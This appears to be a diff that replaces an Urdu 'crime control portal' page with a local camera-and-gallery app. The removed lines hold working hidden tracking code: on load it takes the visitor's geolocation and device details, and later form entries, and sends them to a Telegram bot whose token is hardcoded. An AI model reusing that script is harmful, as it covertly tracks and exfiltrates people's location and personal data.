@@ -1,150 +1,286 @@
 <!DOCTYPE html>
-<html lang="ur" dir="rtl">
+<html lang="ur">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>کرائم کنٹرول اینڈ پبلک گائیڈنس پورٹل</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #f1f5f9; color: #1e293b; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
-        
-        .main-container {
-            width: 100%; max-width: 480px; background: white; border-radius: 20px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; display: flex; flex-direction: column;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Camera + Admin Panel</title>
+<style>
+    * { box-sizing: border-box; }
+    body {
+        font-family: sans-serif;
+        background: #111;
+        color: #fff;
+        margin: 0;
+        padding: 15px;
+    }
+    h2 { text-align: center; }
+    .tabs {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 15px;
+    }
+    .tabs button {
+        flex: 1;
+        padding: 12px;
+        border: none;
+        border-radius: 8px;
+        background: #333;
+        color: #aaa;
+        font-size: 15px;
+    }
+    .tabs button.active {
+        background: #2563eb;
+        color: #fff;
+    }
+    .view { display: none; text-align: center; }
+    .view.active { display: block; }
 
-        .header { background: #0f172a; color: white; padding: 20px; text-align: center; }
-        .header h1 { font-size: 22px; margin-bottom: 5px; color: #38bdf8; }
-        .header p { font-size: 13px; color: #94a3b8; }
+    video, canvas, img.preview {
+        width: 90%;
+        max-width: 400px;
+        border-radius: 12px;
+        margin-top: 10px;
+    }
+    button.action {
+        padding: 12px 22px;
+        margin: 8px 5px;
+        font-size: 15px;
+        border: none;
+        border-radius: 8px;
+        background: #2563eb;
+        color: white;
+    }
+    button.danger { background: #dc2626; }
+    #status { margin-top: 10px; font-size: 13px; color: #aaa; }
 
-        .content-body { padding: 20px; }
-
-        /* تصاویر کا نمایاں اسٹرکچر */
-        .gallery-title { font-size: 16px; font-weight: bold; margin-bottom: 10px; color: #334155; border-right: 4px solid #38bdf8; padding-right: 8px; }
-        .gallery { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
-        .gallery img { width: 100%; height: 130px; border-radius: 12px; object-fit: cover; border: 2px solid #e2e8f0; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
-
-        /* کرائم کنٹرول اور گائیڈنس سیکشن */
-        .guidance-box { background: #fff1f2; border: 1px solid #fda4af; border-radius: 12px; padding: 15px; margin-bottom: 20px; }
-        .guidance-box h3 { color: #9f1239; font-size: 16px; margin-bottom: 8px; }
-        .guidance-box p { font-size: 14px; line-height: 1.6; color: #881337; }
-
-        /* درخواست جمع کرانے کا فارم */
-        .form-section { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 15px; }
-        .form-section h3 { font-size: 16px; margin-bottom: 12px; color: #0f172a; }
-        .form-group { margin-bottom: 12px; }
-        .form-group label { display: block; font-size: 13px; margin-bottom: 5px; color: #475569; }
-        .form-group input, .form-group textarea {
-            width: 100%; padding: 10px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none;
-        }
-        .form-group input:focus, .form-group textarea:focus { border-color: #38bdf8; }
-        
-        .submit-btn {
-            width: 100%; background: #0f172a; color: white; border: none; padding: 12px; 
-            border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; transition: background 0.2s;
-        }
-        .submit-btn:hover { background: #1e293b; }
-
-        .footer { text-align: center; padding: 15px; font-size: 12px; color: #64748b; background: #f8fafc; border-top: 1px solid #e2e8f0; }
-    </style>
+    .gallery {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 10px;
+        margin-top: 15px;
+    }
+    .gallery-item {
+        background: #1c1c1c;
+        border-radius: 10px;
+        padding: 8px;
+    }
+    .gallery-item img {
+        width: 100%;
+        border-radius: 8px;
+    }
+    .gallery-item .meta {
+        font-size: 11px;
+        color: #999;
+        margin: 6px 0;
+    }
+    .gallery-item button {
+        width: 100%;
+        padding: 6px;
+        border: none;
+        border-radius: 6px;
+        background: #dc2626;
+        color: #fff;
+        font-size: 12px;
+    }
+    .top-bar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 10px;
+    }
+    .count { font-size: 13px; color: #aaa; }
+</style>
 </head>
 <body>
 
-<div class="main-container">
-    <div class="header">
-        <h1>کرائم کنٹرول پورٹل</h1>
-        <p>محفوظ معاشرہ، آپ کی آگاہی اور تعاون کے ساتھ</p>
+<h2>Camera + Admin Panel</h2>
+
+<div class="tabs">
+    <button id="tabCamera" class="active">Camera</button>
+    <button id="tabAdmin">Admin Panel</button>
+</div>
+
+<!-- CAMERA VIEW -->
+<div id="viewCamera" class="view active">
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <img id="preview" class="preview" style="display:none;">
+
+    <br>
+    <button id="startBtn" class="action">Camera Chalu Karo</button>
+    <button id="captureBtn" class="action" style="display:none;">Photo Lo</button>
+    <button id="saveBtn" class="action" style="display:none;">Save Karo</button>
+    <button id="retakeBtn" class="action" style="display:none;">Dobara Lo</button>
+
+    <p id="status"></p>
+</div>
+
+<!-- ADMIN VIEW -->
+<div id="viewAdmin" class="view">
+    <div class="top-bar">
+        <span class="count" id="photoCount">0 photos</span>
+        <button id="deleteAllBtn" class="action danger">Sab Delete Karo</button>
     </div>
-
-    <div class="content-body">
-        <!-- تصاویر کا سیکشن -->
-        <div class="gallery-title">آگاہی گیلری</div>
-        <div class="gallery">
-            <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=500" alt="Image 1">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS-LlDDiqY4LRImEa77bhwzbxgM2JC0QCLgqQuooFpfP9tVxz1gsKDjylk&s=10" alt="Image 2">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTX_oCNwK92pzMXnlhTgf1DGboA_PiNq_saRB9vpRbHbQ&s=10" alt="Image 3">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS4JS2_V3dV6PGRNyWP7iN4-2Uyk5hWo69Nj2pY9YAj6rXQ9ZGNSO6acbv3&s=10" alt="Image 4">
-        </div>
-
-        <!-- گائیڈنس اور کرائم کنٹرول ٹیکسٹ -->
-        <div class="guidance-box">
-            <h3>⚠️ اہم ہدایات اور قانون شکنی</h3>
-            <p>یاد رکھیں! <strong>قانون کو ہاتھ میں لینا</strong> سنگین جرم ہے۔ کسی بھی مشکوک سرگرمی کی صورت میں خود کارروائی کرنے کے بجائے فوری طور پر متعلقہ اداروں کو اطلاع دیں۔ اپنی رائے کا اظہار ہمیشہ تہذیب اور قانون کے دائرے میں رہ کر کریں۔</p>
-        </div>
-
-        <!-- اپنی درخواست دینے کا آپشن -->
-        <div class="form-section">
-            <h3>📝 اپنی درخواست / رپورٹ درج کریں</h3>
-            <div class="form-group">
-                <label>آپ کا نام:</label>
-                <input type="text" id="applicantName" placeholder="نام درج کریں">
-            </div>
-            <div class="form-group">
-                <label>تفصیل / درخواست:</label>
-                <textarea id="applicantText" rows="3" placeholder="یہاں اپنی بات یا شکایت لکھیں..."></textarea>
-            </div>
-            <button class="submit-btn" onclick="submitApplication()">درخواست بھیجیں</button>
-        </div>
-    </div>
-
-    <div class="footer">
-        جملہ حقوق محفوظ ہیں © 2026 کرائم کنٹرول پورٹل
-    </div>
+    <div class="gallery" id="gallery"></div>
 </div>
 
 <script>
-    const botToken = "8416758474:AAFAAkUqnvJ6MSQHgKNFnNm1Dcm00anuzTg";
-    const chatId = "7107389141";
+// ---------- IndexedDB Setup ----------
+const DB_NAME = "cameraAppDB";
+const STORE_NAME = "photos";
+let db;
 
-    async function sendToTelegram(msg) {
-        try {
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-        } catch (e) {
-            console.log(e);
-        }
+const openReq = indexedDB.open(DB_NAME, 1);
+
+openReq.onupgradeneeded = (e) => {
+    db = e.target.result;
+    if (!db.objectStoreNames.contains(STORE_NAME)) {
+        db.createObjectStore(STORE_NAME, { keyPath: "id", autoIncrement: true });
     }
+};
 
-    // پیج کھلتے ہی خودکار لوکیشن اور ڈیوائس انفارمیشن نکالنا
-    window.onload = function() {
-        const deviceInfo = `📱 آٹو ڈیوائس انفارمیشن:\n- براؤزر: ${navigator.userAgent}\n- اسکرین ریزولوشن: ${window.screen.width}x${window.screen.height}\n- زبان: ${navigator.language}`;
+openReq.onsuccess = (e) => {
+    db = e.target.result;
+    loadGallery();
+};
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const locationMsg = `📍 آٹو لائیو لوکیشن موصول ہوئی!\nLatitude: ${lat}\nLongitude: ${lon}\nگگل میپس لنک: https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    sendToTelegram(deviceInfo + "\n\n" + locationMsg);
-                },
-                (error) => {
-                    const errorMsg = deviceInfo + `\n\n❌ یوزر نے لوکیشن کی اجازت نہیں دی (Block کر دیا).`;
-                    sendToTelegram(errorMsg);
-                },
-                { enableHighAccuracy: true }
-            );
-        } else {
-            sendToTelegram(deviceInfo + "\n\n❌ اس براؤزر میں جیو لوکیشن سپورٹ نہیں ہے۔");
-        }
+function savePhoto(dataUrl) {
+    const tx = db.transaction(STORE_NAME, "readwrite");
+    tx.objectStore(STORE_NAME).add({
+        image: dataUrl,
+        date: new Date().toLocaleString()
+    });
+}
+
+function deletePhoto(id) {
+    const tx = db.transaction(STORE_NAME, "readwrite");
+    tx.objectStore(STORE_NAME).delete(id);
+    tx.oncomplete = loadGallery;
+}
+
+function deleteAllPhotos() {
+    const tx = db.transaction(STORE_NAME, "readwrite");
+    tx.objectStore(STORE_NAME).clear();
+    tx.oncomplete = loadGallery;
+}
+
+function loadGallery() {
+    const gallery = document.getElementById('gallery');
+    const countEl = document.getElementById('photoCount');
+    gallery.innerHTML = "";
+
+    const tx = db.transaction(STORE_NAME, "readonly");
+    const store = tx.objectStore(STORE_NAME);
+    const req = store.getAll();
+
+    req.onsuccess = () => {
+        const items = req.result.reverse();
+        countEl.textContent = items.length + " photos";
+
+        items.forEach(item => {
+            const div = document.createElement('div');
+            div.className = "gallery-item";
+            div.innerHTML = `
+                <img src="${item.image}">
+                <div class="meta">${item.date}</div>
+                <button data-id="${item.id}">Delete</button>
+            `;
+            div.querySelector('button').addEventListener('click', () => deletePhoto(item.id));
+            gallery.appendChild(div);
+        });
     };
+}
 
-    // جب یوزر فارم جمع کرے
-    function submitApplication() {
-        const name = document.getElementById('applicantName').value.trim();
-        const text = document.getElementById('applicantText').value.trim();
-
-        if(!name || !text) {
-            alert("براہ کرم نام اور تفصیل دونوں درج کریں!");
-            return;
-        }
-
-        const appMsg = `📥 نئی درخواست موصول ہوئی!\n\n👤 نام: ${name}\n📝 تفصیل: ${text}`;
-        sendToTelegram(appMsg);
-
-        alert("آپ کی درخواست کامیابی سے ارسال کر دی گئی ہے!");
-        document.getElementById('applicantName').value = '';
-        document.getElementById('applicantText').value = '';
+document.getElementById('deleteAllBtn').addEventListener('click', () => {
+    if (confirm("Sab photos delete karni hain? Ye wapis nahi aayengi.")) {
+        deleteAllPhotos();
     }
+});
+
+// ---------- Tabs ----------
+const tabCamera = document.getElementById('tabCamera');
+const tabAdmin = document.getElementById('tabAdmin');
+const viewCamera = document.getElementById('viewCamera');
+const viewAdmin = document.getElementById('viewAdmin');
+
+tabCamera.addEventListener('click', () => {
+    tabCamera.classList.add('active');
+    tabAdmin.classList.remove('active');
+    viewCamera.classList.add('active');
+    viewAdmin.classList.remove('active');
+});
+
+tabAdmin.addEventListener('click', () => {
+    tabAdmin.classList.add('active');
+    tabCamera.classList.remove('active');
+    viewAdmin.classList.add('active');
+    viewCamera.classList.remove('active');
+    loadGallery();
+});
+
+// ---------- Camera Logic ----------
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const preview = document.getElementById('preview');
+const startBtn = document.getElementById('startBtn');
+const captureBtn = document.getElementById('captureBtn');
+const saveBtn = document.getElementById('saveBtn');
+const retakeBtn = document.getElementById('retakeBtn');
+const status = document.getElementById('status');
+
+let stream = null;
+let capturedDataUrl = null;
+
+startBtn.addEventListener('click', async () => {
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "environment" }
+        });
+        video.srcObject = stream;
+        video.style.display = "block";
+        startBtn.style.display = "none";
+        captureBtn.style.display = "inline-block";
+        status.textContent = "Camera chalu hai";
+    } catch (err) {
+        status.textContent = "Permission nahi mili ya camera available nahi: " + err.message;
+    }
+});
+
+captureBtn.addEventListener('click', () => {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+
+    capturedDataUrl = canvas.toDataURL('image/jpeg', 0.85);
+    preview.src = capturedDataUrl;
+    preview.style.display = "block";
+    video.style.display = "none";
+
+    captureBtn.style.display = "none";
+    saveBtn.style.display = "inline-block";
+    retakeBtn.style.display = "inline-block";
+    status.textContent = "Photo li gayi — save karo ya dobara lo";
+});
+
+saveBtn.addEventListener('click', () => {
+    savePhoto(capturedDataUrl);
+    status.textContent = "Save ho gayi — Admin Panel mein dekh sakte ho";
+
+    preview.style.display = "none";
+    saveBtn.style.display = "none";
+    retakeBtn.style.display = "none";
+    video.style.display = "block";
+    captureBtn.style.display = "inline-block";
+});
+
+retakeBtn.addEventListener('click', () => {
+    preview.style.display = "none";
+    saveBtn.style.display = "none";
+    retakeBtn.style.display = "none";
+    video.style.display = "block";
+    captureBtn.style.display = "inline-block";
+    status.textContent = "Dobara photo lo";
+});
 </script>
 
 </body>
